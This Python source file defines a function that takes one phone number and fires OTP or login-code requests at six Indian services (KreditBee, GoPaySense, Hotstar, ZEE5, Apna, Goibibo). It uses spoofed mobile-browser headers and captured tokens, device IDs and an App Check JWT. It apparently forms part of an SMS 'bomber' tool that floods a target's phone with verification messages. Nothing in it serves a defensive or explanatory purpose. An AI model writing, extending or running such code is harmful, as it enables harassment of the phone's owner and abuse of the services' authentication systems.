import requests

def run_apis2(mobile_no):
    results = []
    
    if not mobile_no.startswith("+"):
        number = "+91" + mobile_no
    else:
        number = mobile_no

    # --- API 7: KreditBee ---
    try:
        headers7 = {
            'authority': 'api.kreditbee.in',
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'en-IN,en;q=0.9',
            'authorization': 'Bearer null',
            'content-type': 'application/json',
            'origin': 'https://pwa-web1.kreditbee.in',
            'referer': 'https://pwa-web1.kreditbee.in/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'x-kb-info': 'eyJsYXQiOiIwIiwibG5nIjoiMCIsImRpZCI6IiIsImFwcHR5cGUiOiJ3ZWIiLCJhcHB2ZXIiOiIiLCJpc3Ryb3RlZCI6IiJ9',
        }
        json_data7 = {
            'reason': 'loginOrRegister',
            'mobile': number.replace("+91", ""),
            'appsflyerId': '650acda6-5926-435b-bb5c-e7114b6ac279-p',
            'mediaSource': '',
            'firebaseInstanceId': '',
            'firebaseiosAppInstId': '',
        }
        r7 = requests.put('https://api.kreditbee.in/v1/me/otp', headers=headers7, json=json_data7, timeout=10)
        results.append({"service": "KreditBee", "status": r7.status_code, "response": r7.text})
        print(f"KreditBee: {r7.status_code}")
    except Exception as e:
        results.append({"service": "KreditBee", "status": "Error", "response": str(e)})
        print(f"KreditBee Error: {e}")
        
    # --- API 8: GoPaySense ---
    try:
        headers8 = {
            'Accept': '*/*',
            'Accept-Language': 'en-IN,en;q=0.9',
            'Connection': 'keep-alive',
            'Content-Type': 'application/json',
            'Origin': 'https://www.gopaysense.com',
            'Referer': 'https://www.gopaysense.com/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site',
            'User-Acept': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
        }
        json_data8 = {
            'phone': number.replace("+91", ""),
        }
        r8 = requests.post('https://api.gopaysense.com/users/otp', 
                          headers=headers8, json=json_data8, timeout=10)
        results.append({"service": "GoPaySense", "status": r8.status_code, "response": r8.text})
        print(f"GoPaySense: {r8.status_code}")
    except Exception as e:
        results.append({"service": "GoPaySense", "status": "Error", "response": str(e)})
        print(f"GoPaySense Error: {e}")
        
    # --- API 9: Hotstar ---
    try:
        headers9 = {
            'authority': 'www.hotstar.com',
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'eng',
            'content-type': 'application/json',
            'origin': 'https://www.hotstar.com',
            'referer': 'https://www.hotstar.com/in/onboarding?ref=%2Fin%2Fhome',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'x-country-code': 'in',
            'x-hs-accept-language': 'eng',
            'x-hs-app': '250825000',
            'x-hs-client': 'platform:mweb;app_version:25.08.25.0;browser:Chrome;schema_version:0.0.1556;os:Android;os_version:10;browser_version:137;network_data:4g',
            'x-hs-client-targeting': 'ad_id:23a701-3923cb-83c11d-6b809e;user_lat:false;',
            'x-hs-device-id': '23a701-3923cb-83c11d-6b809e',
            'x-hs-is-retry': 'false',
            'x-hs-platform': 'mweb',
            'x-hs-request-id': '97ac5-e89e-376608-61d01e',
            'x-hs-retry-count': '0',
            'x-request-id': '97ac5-e89e-376608-61d01e',
        }
        params9 = {
            'action': 'userRegistration',
        }
        json_data9 = {
            'body': {
                '@type': 'type.googleapis.com/feature.login.InitiatePhoneLoginRequest',
                'initiate_by': 0,
                'recaptcha_token': '',
                'phone_number': number.replace("+91", ""),
            },
        }
        r9 = requests.post(
            'https://www.hotstar.com/api/internal/bff/v2/freshstart/pages/1/spaces/1/widgets/8',
            params=params9,
            headers=headers9,
            json=json_data9,
            timeout=10
        )
        results.append({"service": "Hotstar", "status": r9.status_code, "response": r9.text})
        print(f"Hotstar: {r9.status_code}")
    except Exception as e:
        results.append({"service": "Hotstar", "status": "Error", "response": str(e)})
        print(f"Hotstar Error: {e}")
        
    # --- API 10: ZEE5 ---
    try:
        headers10 = {
            'authority': 'auth.zee5.com',
            'accept': 'application/json',
            'accept-language': 'en-IN,en;q=0.9',
            'content-type': 'application/json',
            'device_id': 'f04615b2-b062-4e89-b241-32980ef1cc64',
            'esk': 'ZjA0NjE1Yj2YjA2Mi00ZTg5LWIyNDEtMzI5ODBlZjFjYzY0X19nQlFhWkxpTmRHTjlVc0NLWmFsb2doejl0OVN0V0xTRF9fMTc1NzEwMTIwNjE2Mw==',
            'origin': 'https://www.zee5.com',
            'referer': 'https://www.zee5.com/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'x-z5-guest-token': 'f04615b2-b062-4e89-b241-32980ef1cc64',
        }
        json_data10 = {
            'phoneno': '91' + number.replace("+91", ""),
        }
        r10 = requests.post('https://auth.zee5.com/v1/user/sendotp', 
                           headers=headers10, json=json_data10, timeout=10)
        results.append({"service": "ZEE5", "status": r10.status_code, "response": r10.text})
        print(f"ZEE5: {r10.status_code}")
    except Exception as e:
        results.append({"service": "ZEE5", "status": "Error", "response": str(e)})
        print(f"ZEE5 Error: {e}")
        
    # --- API 11: Apna ---
    try:
        headers11 = {
            "accept": "application/json, text/plain, */*",
            "content-type": "application/json",
            "origin": "https://employer.apna.co",
            "referer": "https://employer.apna.co/",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
            "x-firebase-appcheck": "eyJraWQiOiIwMHlhdmciLCJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiIxOjk3ODQ2Mjg4Mjk5MTp3ZWI6ZGQ4ZThmNzE5NzVkYjQ2YjRiNjg1YSIsImF1ZCI6WyJwcm9qZWN0cy85Nzg0NjI4ODI5OTEiLCJwcm9qZWN0cy9hcG5hdGltZS1mYmM3MiJdLCJwcm92aWRlciI6InJlY2FwdGNoYV92MyIsImlzcyI6Imh0dHBzOi8vZmlyZWJhc2VhcHBjaGVjay5nb29nbGVhcGlzLmNvbS85Nzg0NjI4ODI5OTEiLCJleHAiOjE3NTcxMzY2MTEsImlhdCI6MTc1NzA1MDIxMSwianRpIjoiTlRSUzNmbUxtc2lHamxvc0pRRnhteXlJLUVqS2tscUxoejBCNFJIY3RmcyJ9.jt2hcNM6k-Vj-vcfLRE9RTa5hKjLvUl2rvKaoQRhnqgGTlN6R49zzCw7DwXTtFCRwi-WsjUiv2UrZYn1RDba1Fn3d4KbIGpeJmHAZlTa9TJPfpmbaapl5t7GGRerq1toxu7W9wGE1VoHeZXjPW4eu0cRzgtbRxXRudnrMoLuz_Wxd9pzGG7eBqg58uksWA61YWMSylADaFh-wVt1WoWUDx0E7M5Sfwpbxi7x60HyU_fZkfC9NOIcvvm1C6IEpvPPh8wSBTPc1rHKod-oy2pujlYjCb8IYgW0KTbiwA7gP7XsQg8R0VmjLgsnBrTBDcd00ttP_V7cRQTFLoJ3tKMCH1B6LPO5HmD12GCtnUVoO7MjHVRySODN5cg9r_yJwZaFOSue8FXf0uB8B0PNni63MuBo7ZnGU1DaHwkSLlArWDhkrkbVgfX23d8TJNDOEyqQSitRskEwEXNfFiz53j0RiHg7T10taRA0TtqwnDbGWyRktND6VuN_cKnO4ZUJbjda",
        }
        payload11 = {
            "phone_number": "91" + number.replace("+91", ""),
            "retries": 0,
            "hash_type": "employer",
            "source": "employer",
        }
        r11 = requests.post("https://production.apna.co/api/userprofile/v1/otp/", 
                           headers=headers11, json=payload11, timeout=10)
        results.append({"service": "Apna", "status": r11.status_code, "response": r11.text})
        print(f"Apna: {r11.status_code}")
    except Exception as e:
        results.append({"service": "Apna", "status": "Error", "response": str(e)})
        print(f"Apna Error: {e}")
        
    # --- API 12: Goibibo ---
    try:
        headers12 = {
            'authority': 'userservice.goibibo.com',
            'accept': '*/*',
            'accept-language': 'en-IN,en;q=0.9',
            'authorization': 'h4nhc9jcgpAGIjp',
            'content-type': 'application/json',
            'currency': 'inr',
            'language': 'eng',
            'origin': 'https://www.goibibo.com',
            'referer': 'https://www.goibibo.com/',
            'region': 'in',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'user-identifier': '{"type":"auth","deviceId":"d01e1707-1eae-4237-a8c8-6027e05ce785","os":"pwa","osVersion":"osVersion","appVersion":"appVersion","imie":"imie","ipAddress":"ipAddress","timeZone":"+5.30 GMT","value":"","deviceOrBrowserInfo":"Chrome"}',
            'x-request-tracker': '649456c4-6103-41b9-a59d-28099aaedfa9',
        }
        json_data12 = {
            'loginId': number.replace("+91", ""),
            'countryCode': 91,
            'channel': [
                'MOBILE',
            ],
            'type': 6,
            'appHashKey': '@www.goibibo.com #',
        }
        r12 = requests.post(
            'https://userservice.goibibo.com/ext/web/pwa/send/token/OTP_IS_REG',
            headers=headers12,
            json=json_data12,
            timeout=10
        )
        results.append({"service": "Goibibo", "status": r12.status_code, "response": r12.text})
        print(f"Goibibo: {r12.status_code}")
    except Exception as e:
        results.append({"service": "Goibibo", "status": "Error", "response": str(e)})
        print(f"Goibibo Error: {e}")

    return results
